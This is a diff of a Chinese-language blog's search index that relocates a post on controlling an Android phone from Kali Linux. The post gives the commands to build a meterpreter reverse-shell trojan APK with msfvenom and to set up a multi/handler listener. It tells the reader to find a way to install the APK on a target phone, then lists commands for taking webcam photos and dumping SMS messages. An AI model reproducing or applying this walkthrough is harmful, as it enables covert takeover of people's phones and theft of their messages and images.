@@ -1,6 +1,57 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>kali linux 控制安卓手机</title>
+    <url>/archives/396f2685.html</url>
+    <content><![CDATA[<h1 id="kali-linux-控制安卓手机"><a href="#kali-linux-控制安卓手机" class="headerlink" title="kali linux 控制安卓手机"></a>kali linux 控制安卓手机</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
+<li>本博客并不是写给零基础的，不是很详细<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2></li>
+<li>1.VMware Workstation Pro 虚拟机 版本任意 建议14或15 版本</li>
+<li>2.kali linux 2020镜像  建议使用用迅雷下载<br>  <a href="https://mirrors.aliyun.com/kali-images/kali-2020.2/kali-linux-2020.2-live-amd64.iso">官网镜像</a></li>
+<li>一部测试用的并且和kali Linux在一个网段下的安卓手机或者用电脑中的模拟器也可以 但是有一些命令无法执行比如:拍照….<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2></li>
+<li>首先打开已经安装好的kali linux,启动终端，输入 ipconfig 查看 当前系统IP地址<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ipconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>然后执行 msfvenom -p android/meterpreter/reverse_tcp LHOST= 这里输入刚才查出来的IP地址 LPORT=这里输入端口号 R &gt; 木马软件的名字.apk<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=8888 R &gt; text.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>想办法将做出来的软件安装到目标手机上，这里我就将软件直接安装到手机上</li>
+<li>启动渗透测试框架<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfconsole <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>使用渗透测试框架中的模块<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">use multi/handler
+set payload android/meterpreter/reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+<li>此时输入 show options 可以获得要输入的参数<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>然后直接设定即可<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">set LPORT 8888
+set LHOST 192.168.1.10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+<li>执行 run 命令之后会获得一个会话等待连接 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">run <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+此时输入 ？ 可以得到可以执行的命令例如<pre class="line-numbers language-text" data-language="text"><code class="language-text">sysinfo # 系统信息
+app_list # 安装的软件列表
+webcam_snap # 打开摄像头并拍照
+dump_sms  # 获取短信内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+</li>
+</ul>
+<h2 id="博客持续更新中……"><a href="#博客持续更新中……" class="headerlink" title="博客持续更新中……."></a>博客持续更新中…….</h2><script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>kali linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Ncork内网穿透</title>
     <url>/archives/f70cbfb8.html</url>
     <content><![CDATA[<h1 id="Ncork内网穿透"><a href="#Ncork内网穿透" class="headerlink" title="Ncork内网穿透"></a>Ncork内网穿透</h1><h4 id="什么是内网穿透？内网穿透是一个什么样的效果？"><a href="#什么是内网穿透？内网穿透是一个什么样的效果？" class="headerlink" title="什么是内网穿透？内网穿透是一个什么样的效果？"></a>什么是内网穿透？内网穿透是一个什么样的效果？</h4><ul>
@@ -275,57 +326,6 @@ phy0	wlp8s0mon	iwlwifi		Intel Corporation Centrino Wireless-N 2230 (rev c4)
 </li>
 </ul>
 <h3 id="更多安装方式参考：安装-Aircrack-ng"><a href="#更多安装方式参考：安装-Aircrack-ng" class="headerlink" title="更多安装方式参考：安装 Aircrack-ng"></a>更多安装方式参考：<a href="https://aircrack-ng.org/install.html">安装 Aircrack-ng</a></h3><h1 id="谨以此片，祭奠逝去的青春！"><a href="#谨以此片，祭奠逝去的青春！" class="headerlink" title="谨以此片，祭奠逝去的青春！"></a>谨以此片，祭奠逝去的青春！</h1><h2 id="博客持续更新中……"><a href="#博客持续更新中……" class="headerlink" title="博客持续更新中……."></a>博客持续更新中…….</h2><script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>kali linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>kali linux 控制安卓手机</title>
-    <url>/archives/396f2685.html</url>
-    <content><![CDATA[<h1 id="kali-linux-控制安卓手机"><a href="#kali-linux-控制安卓手机" class="headerlink" title="kali linux 控制安卓手机"></a>kali linux 控制安卓手机</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
-<li>本博客并不是写给零基础的，不是很详细<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2></li>
-<li>1.VMware Workstation Pro 虚拟机 版本任意 建议14或15 版本</li>
-<li>2.kali linux 2020镜像  建议使用用迅雷下载<br>  <a href="https://mirrors.aliyun.com/kali-images/kali-2020.2/kali-linux-2020.2-live-amd64.iso">官网镜像</a></li>
-<li>一部测试用的并且和kali Linux在一个网段下的安卓手机或者用电脑中的模拟器也可以 但是有一些命令无法执行比如:拍照….<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2></li>
-<li>首先打开已经安装好的kali linux,启动终端，输入 ipconfig 查看 当前系统IP地址<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ipconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>然后执行 msfvenom -p android/meterpreter/reverse_tcp LHOST= 这里输入刚才查出来的IP地址 LPORT=这里输入端口号 R &gt; 木马软件的名字.apk<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=8888 R &gt; text.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>想办法将做出来的软件安装到目标手机上，这里我就将软件直接安装到手机上</li>
-<li>启动渗透测试框架<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfconsole <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>使用渗透测试框架中的模块<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">use multi/handler
-set payload android/meterpreter/reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
-<li>此时输入 show options 可以获得要输入的参数<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>然后直接设定即可<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">set LPORT 8888
-set LHOST 192.168.1.10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
-<li>执行 run 命令之后会获得一个会话等待连接 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">run <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-此时输入 ？ 可以得到可以执行的命令例如<pre class="line-numbers language-text" data-language="text"><code class="language-text">sysinfo # 系统信息
-app_list # 安装的软件列表
-webcam_snap # 打开摄像头并拍照
-dump_sms  # 获取短信内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-</li>
-</ul>
-<h2 id="博客持续更新中……"><a href="#博客持续更新中……" class="headerlink" title="博客持续更新中……."></a>博客持续更新中…….</h2><script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
